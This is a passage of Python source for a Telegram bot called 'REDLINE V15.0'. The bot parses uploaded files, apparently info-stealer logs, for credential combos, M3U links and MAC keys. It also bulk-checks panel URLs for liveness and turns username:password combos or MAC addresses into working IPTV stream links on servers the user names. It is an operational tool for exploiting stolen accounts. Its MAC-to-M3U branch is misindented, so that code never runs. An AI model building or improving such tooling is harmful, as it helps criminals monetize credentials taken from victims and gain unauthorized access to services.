            os.remove(result_path)
            context.user_data.clear()
            return

        # === HANDLE CHECK LIVE PANELS ===
        elif mode == 'check_panels':
            await status_msg.edit_text(
                "⏳ <b>Checking panels...</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🔎 Categorizing panels...",
                parse_mode='HTML'
            )
            urls = [line.strip() for line in text.split('\n') if line.strip().startswith(('http://','https://'))]
            if not urls:
                await status_msg.edit_text(
                    "❌ <b>No URLs found!</b>",
                    parse_mode='HTML'
                )
                os.remove(file_path)
                context.user_data.clear()
                return
            urls = urls[:1000]
            categories = {k: [] for k in [
                'VALID','VPN_NEEDED','WAF','CAPTCHA','DNS_ERROR','TIMEOUT','INVALID','ERROR']}
            with ThreadPoolExecutor(max_workers=12) as ex:
                futs = {ex.submit(PanelChecker.categorize, u, 3, PROXY_CONFIG): u for u in urls}
                for fu in as_completed(futs):
                    cat, det = fu.result()
                    u = futs[fu]
                    categories.setdefault(cat, []).append((u, det))
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"PANELS_CHECK_{timestamp}.txt"
            result_path = os.path.join(TEMP_DIR, result_filename)
            with open(result_path, 'w', encoding='utf-8') as f:
                f.write(f"# Check Live Panels (Categorized)\n")
                total_valid = len(categories.get('VALID', []))
                f.write(f"# Checked: {len(urls)} | VALID: {total_valid}\n")
                f.write("#" + "="*50 + "\n\n")
                order = ['VALID','VPN_NEEDED','WAF','CAPTCHA','DNS_ERROR','TIMEOUT','INVALID','ERROR']
                for cat in order:
                    items = categories.get(cat, [])
                    if not items:
                        continue
                    f.write(f"# ===== {cat} ({len(items)}) =====\n")
                    for u, det in items:
                        suffix = f"  # {det}" if det else ""
                        f.write(f"{u}{suffix}\n")
                    f.write("\n")
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>Panels Check Complete!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 VALID: {len(categories.get('VALID', []))} / {len(urls)}"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            await status_msg.delete()
            os.remove(file_path)
            os.remove(result_path)
            context.user_data.clear()
            return
        
        # Update status for regular extractions
        # === AI AUTO-DETECTION (CACHED - uses only 500 chars) ===
        ai_detected = ""
        if ai_assistant.enabled:
            try:
                detection = await ai_assistant.detect_file_type(text)
                if detection.get('confidence', 0) >= 60:
                    detected_type = detection.get('type', '')
                    ai_detected = f"\n🤖 AI detected: {detected_type.upper()}"
            except Exception:
                pass
        
        await status_msg.edit_text(
            f"⏳ <b>Processing...</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━{ai_detected}\n\n"
            f"🔍 Extracting data...",
            parse_mode='HTML'
        )
        
        # Extract based on mode
        extractor = RedlineExtractor()
        results = set()
        result_type = mode.upper()
        
        if mode == 'np':
            results = extractor.extract_np(text)
        elif mode == 'up':
            results = extractor.extract_up(text)
        elif mode == 'mp':
            results = extractor.extract_mp(text)
        elif mode == 'm3u':
            results = extractor.extract_m3u(text)
        elif mode == 'mac':
            results = extractor.extract_mac_key(text)
        elif mode == 'all':
            all_results = extractor.extract_all(text)
            # Combine all results
            combined = []
            for key, items in all_results.items():
                if items:
                    combined.append(f"\n# ===== {key.upper()} ({len(items)} found) =====")
                    combined.extend(sorted(items))
            results = set(combined)
            result_type = "ALL_COMBOS"
        
        # Check if results found
        if not results:
            await status_msg.edit_text(
                "❌ <b>No results found!</b>\n\n"
                "Make sure the file contains the required data",
                parse_mode='HTML'
            )
            # Clean up
            os.remove(file_path)
            context.user_data.clear()
            return
        
        # Create result file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_filename = f"{result_type}_{timestamp}.txt"
        result_path = os.path.join(TEMP_DIR, result_filename)
        
        # Write results
        with open(result_path, 'w', encoding='utf-8') as f:
            f.write(f"# REDLINE V15.0 - {result_type}\n")
            f.write(f"# Extracted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Total Found: {len(results)}\n")
            f.write("#" + "="*50 + "\n\n")
            f.write('\n'.join(sorted(results)))
        
        # === AI ENHANCEMENTS (CACHED - won't overload API) ===
        ai_caption_extra = ""
        
        # Quality scoring (only for single types, not ALL)
        if mode != 'all' and ai_assistant.enabled and len(results) > 0:
            try:
                results_list = list(results)[:5]  # Only sample 5
                quality = await ai_assistant.score_quality(results_list)
                if quality.get('overall', 0) > 0:
                    score = quality['overall']
                    emoji = "🟢" if score >= 70 else "🟡" if score >= 40 else "🔴"
                    ai_caption_extra += f"\n{emoji} AI Quality: {score}/100"
                    if quality.get('advice'):
                        ai_caption_extra += f"\n💡 {quality['advice']}"
            except Exception:
                pass
        
        # Smart recommendation
        recommendation = await ai_assistant.recommend_action(mode, len(results))
        
        # Send result file
        with open(result_path, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=result_filename,
                caption=(
                    f"✅ <b>Extraction Complete!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 Type: {result_type}\n"
                    f"🎯 Results: {len(results):,}\n"
                    f"📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                    f"{ai_caption_extra}\n\n"
                    f"{recommendation if len(recommendation) < 200 else '✨ Ready to use!'}"
                ),
                parse_mode='HTML',
                reply_markup=get_main_menu()
            )
        
        # Delete status message
        await status_msg.delete()
        
        # Clean up files
        os.remove(file_path)
        os.remove(result_path)
        
        # Clear user mode
        context.user_data.clear()
        
        # Post to channel (optional): use first allowed channel if set
        try:
            target_channel = next(iter(ALLOWED_CHANNEL_IDS)) if ALLOWED_CHANNEL_IDS else None
            if target_channel is not None:
                await context.bot.send_message(
                    chat_id=target_channel,
                    text=(
                        f"📊 <b>New Extraction</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"👤 User: {update.effective_user.mention_html()}\n"
                        f"📁 Type: {result_type}\n"
                        f"🎯 Results: {len(results):,}\n"
                        f"⏰ {datetime.now().strftime('%H:%M:%S')}"
                    ),
                    parse_mode='HTML'
                )
        except Exception as e:
            logger.warning(f"Could not post to channel: {e}")
        
    except Exception as e:
        logger.error(f"Error processing file: {e}")
        await status_msg.edit_text(
            f"❌ <b>Error occurred</b>\n\n"
            f"Please try again\n"
            f"Error: {str(e)}",
            parse_mode='HTML'
        )
        
        # Clean up on error
        if os.path.exists(file_path):
            os.remove(file_path)
        context.user_data.clear()

async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages - for Base URL input and Phase 1 flows"""
    if not allowed_chat(update):
        try:
            chat = update.effective_chat
            txt = getattr(update.effective_message,'text',None)
            logger.info(f"Blocked text from chat type={getattr(chat,'type',None)} id={getattr(chat,'id',None)} text={txt}")
        except Exception:
            pass
        return
    if update.effective_chat and not _allow_rate(update.effective_chat.id):
        await send_rate_limit_warning(update)
        return
    mode = context.user_data.get('mode')
    # Support /redline in channels or allowed private
    if update.effective_message and getattr(update.effective_message, 'text', None):
        txt = update.effective_message.text.strip()
        if txt.startswith('/redline'):
            await start(update, context)
            return
    
    # Check if we're in combo_to_m3u mode and waiting for base URL
    if mode == 'combo_to_m3u' and 'combo_data' in context.user_data:
        base_url = update.message.text.strip()
        
        # Validate URL format
        if not base_url.startswith(('http://', 'https://')):
            await update.message.reply_text(
                "❌ <b>Invalid URL!</b>\n\n"
                "URL must start with http:// or https://\n\n"
                "<b>Example:</b>\n"
                "<code>http://example.com:8080</code>",
                parse_mode='HTML'
            )
            return
        
        # Remove trailing slash
        base_url = base_url.rstrip('/')
        
        # Show processing message
        status_msg = await update.message.reply_text(
            "⏳ <b>Converting Combo→M3U...</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔄 Creating M3U links...",
            parse_mode='HTML'
        )
        try:
            await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
        except Exception:
            pass
        
        try:
            # Get stored combo data
            combo_data = context.user_data.get('combo_data', '')
            
            # Convert combo to M3U
            results = M3UConverter.combo_to_m3u(combo_data, base_url)
            
            if not results:
                await status_msg.edit_text(
                    "❌ <b>No valid combos found!</b>\n\n"
                    "Make sure file contains username:password format",
                    parse_mode='HTML'
                )
                context.user_data.clear()
                return
            
            # Create result file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"COMBO_TO_M3U_{timestamp}.txt"
            result_path = os.path.join(TEMP_DIR, result_filename)
            
            with open(result_path, 'w', encoding='utf-8') as f:
                f.write(f"# Combo to M3U Conversion\n")
                f.write(f"# Converted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Base URL: {base_url}\n")
                f.write(f"# Total M3U Links: {len(results)}\n")
                f.write("#" + "="*50 + "\n\n")
                f.write('\n'.join(sorted(results)))
            
            # Send result
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>Combo→M3U Complete!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 Created: {len(results):,} M3U links\n"
                        f"🌐 Base URL: <code>{base_url}</code>\n"
                        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            
            await status_msg.delete()
            os.remove(result_path)
            context.user_data.clear()
            
        except Exception as e:
            logger.error(f"Error in combo_to_m3u: {e}")
            await status_msg.edit_text(
                f"❌ <b>Error occurred</b>\n\n"
                f"Please try again\n"
                f"Error: {str(e)}",
                parse_mode='HTML'
            )
            context.user_data.clear()
        return
    
    # MAC→M3U flow: ask host then MAC
    if mode == 'mac_to_m3u':
        step = context.user_data.get('step')
        if step == 'ask_host':
            host = update.message.text.strip()
            if not host.startswith(('http://','https://')):
                await update.message.reply_html("❌ <b>Invalid host</b>\nExample: <code>http://example.com:8080</code>")
                return
            context.user_data['host'] = host.rstrip('/')
            context.user_data['step'] = 'ask_mac'
            await update.message.reply_html(
                "✅ Host saved!\n\n📝 Now send MAC address (format: <code>00:1A:79:xx:xx:xx</code>)"
            )
            return
        elif step == 'ask_mac':
            mac = update.message.text.strip().upper()
            if not re.match(r"(?i)^[0-9A-F]{2}(:[0-9A-F]{2}){5}$", mac):
                await update.message.reply_html("❌ <b>Invalid MAC format</b>")
                return
            host = context.user_data.get('host')
            status_msg = await update.message.reply_html("⏳ <b>Fetching channels...</b>")
        try:
            await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.UPLOAD_DOCUMENT)
        except Exception:
            pass
            channels, err = MACConverter.mac_to_m3u(host, mac)
            if err or not channels:
                await status_msg.edit_text(
                    f"❌ <b>Failed</b>\n{err or 'No channels found'}",
                    parse_mode='HTML'
                )
                context.user_data.clear()
                return
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"MAC_TO_M3U_{timestamp}.m3u"
            result_path = os.path.join(TEMP_DIR, result_filename)
            with open(result_path, 'w', encoding='utf-8') as f:
                f.write('#EXTM3U\n')
                for ch in channels:
                    name = ch.get('name','Channel')
                    num = ch.get('number','0')
                    url = ch.get('url','')
                    f.write(f"#EXTINF:-1 tvg-id=\"\" tvg-name=\"{name}\" tvg-logo=\"\" group-title=\"\",{name}\n")
                    f.write(f"{url}\n")
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>MAC→M3U Complete!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 Channels: {len(channels):,}\n"
                        f"🌐 Host: <code>{host}</code>\n"
                        f"🖥️ MAC: <code>{mac}</code>"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            await status_msg.delete()
            os.remove(result_path)
            context.user_data.clear()
            return
    
    # M3U→MAC via text (paste URLs)
    if mode == 'm3u_to_mac':
        lines = [l.strip() for l in update.message.text.split('\n') if l.strip()]
        mac_urls = MACConverter.m3u_to_mac('\n'.join(lines))
        if not mac_urls:
            await update.message.reply_html("❌ <b>No valid M3U links in text</b>")
            return
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_filename = f"M3U_TO_MAC_{timestamp}.m3u"
        result_path = os.path.join(TEMP_DIR, result_filename)
        with open(result_path, 'w', encoding='utf-8') as f:
            f.write('#EXTM3U\n')
            for url in sorted(mac_urls):
                f.write(f"{url}\n")
        with open(result_path, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=result_filename,
                caption=(
                    f"✅ <b>M3U→MAC Complete!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 URLs: {len(mac_urls):,}"
                ),
                parse_mode='HTML',
                reply_markup=get_main_menu()
            )
        os.remove(result_path)
        context.user_data.clear()
        return

    # No mode set - ignore message (don't spam users)
    # Bot only responds when user explicitly uses /redline or during active mode
    return

# ============================================
# MAIN - START BOT
# ============================================

def main():
    """Start the bot"""
    logger.info("🤖 Starting REDLINE V15.0 Telegram Bot...")
    
    # Create application with proxy support (if Telegram is blocked)
    # Uncomment the proxy lines below if you need to use a proxy
    
    # Option 1: Without proxy (normal)
    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .get_updates_read_timeout(30)
        .get_updates_write_timeout(30)
        .get_updates_connect_timeout(30)
        .get_updates_pool_timeout(30)
        .build()
    )
    
    # Option 2: With HTTP proxy (if Telegram blocked - uncomment these)
    # from telegram.request import HTTPXRequest
    # request = HTTPXRequest(proxy_url="http://your-proxy:port")
    # application = Application.builder().token(BOT_TOKEN).request(request).build()
    
    # Option 3: With SOCKS5 proxy (if Telegram blocked - uncomment these)
    # from telegram.request import HTTPXRequest
    # request = HTTPXRequest(proxy_url="socks5://your-proxy:port")
    # application = Application.builder().token(BOT_TOKEN).request(request).build()
    
    # Start health server for platform TCP checks
    start_health_server()

    # Add handlers
    application.add_handler(CommandHandler("redline", start))
    application.add_handler(CommandHandler("health", health_cmd))
    application.add_handler(CommandHandler("help", help_cmd))
    # AI command handlers
    application.add_handler(CommandHandler("ai", ai_chat))
    application.add_handler(CommandHandler("analyze", ai_analyze_cmd))
    application.add_handler(CommandHandler("explain", ai_explain_cmd))
    application.add_handler(CallbackQueryHandler(button_callback))
    # Private/group messages (we guard inside)
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    # Channel posts (use MessageHandler with channel chat type filter)
    application.add_handler(MessageHandler(filters.ChatType.CHANNEL & filters.Document.ALL, handle_document))
    application.add_handler(MessageHandler(filters.ChatType.CHANNEL & (filters.TEXT | filters.COMMAND), handle_text_message))

    # Register global error handler
    application.add_error_handler(error_handler)

    # JobQueue: temp cleanup every 10 minutes
    async def _cleanup_temp_cb(context: ContextTypes.DEFAULT_TYPE):
        try:
            cutoff = time.time() - 15 * 60
            for name in os.listdir(TEMP_DIR):
                p = os.path.join(TEMP_DIR, name)
                try:
                    if os.path.isfile(p) and os.path.getmtime(p) < cutoff:
                        os.remove(p)
                except Exception:
                    continue
            
            # Clean expired cache entries
            m3u_cache.clear_expired()
            result_cache.clear_expired()
        except Exception:
            pass

    # Schedule cleanup job if JobQueue is available
    if application.job_queue:
        application.job_queue.run_repeating(_cleanup_temp_cb, interval=600, first=120)
    else:
        logger.warning("⚠️ JobQueue not available. Cleanup tasks disabled.")
    
    # Start bot
    if not ALLOWED_CHANNEL_IDS:
        logger.warning("No channels configured. Set CHANNEL_IDS or CHANNEL_ID env vars.")
    logger.info("✅ Bot is running! Press Ctrl+C to stop.")
    logger.info(f"📱 Channels: {sorted(list(ALLOWED_CHANNEL_IDS))}")
    logger.info("🚀 Progress tracking & caching enabled")
    logger.info(f"📊 Resource limits: {format_file_size(MAX_FILE_SIZE)} / {format_number(MAX_LINES)} lines / {MAX_WORKERS} workers")
    
    # Run bot with retry on conflict
    logger.info("🚀 Starting polling loop...")
    max_retries = 3
    for attempt in range(max_retries):
        try:
            application.run_polling(
                allowed_updates=Update.ALL_TYPES,
                drop_pending_updates=True
            )
            break
        except telegram.error.Conflict as e:
            if attempt < max_retries - 1:
                wait_time = 10 * (attempt + 1)
                logger.warning(f"⚠️ Conflict on start (attempt {attempt+1}/{max_retries}). Waiting {wait_time}s...")
                time.sleep(wait_time)
            else:
                logger.error(f"❌ Failed to start after {max_retries} attempts: {e}")
                raise
        except Exception as e:
            logger.error(f"❌ Unexpected error during polling: {e}")
            raise

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logger.info("🛑 Bot stopped by user")
    except Exception as e:
        logger.error(f"❌ Bot error: {e}")
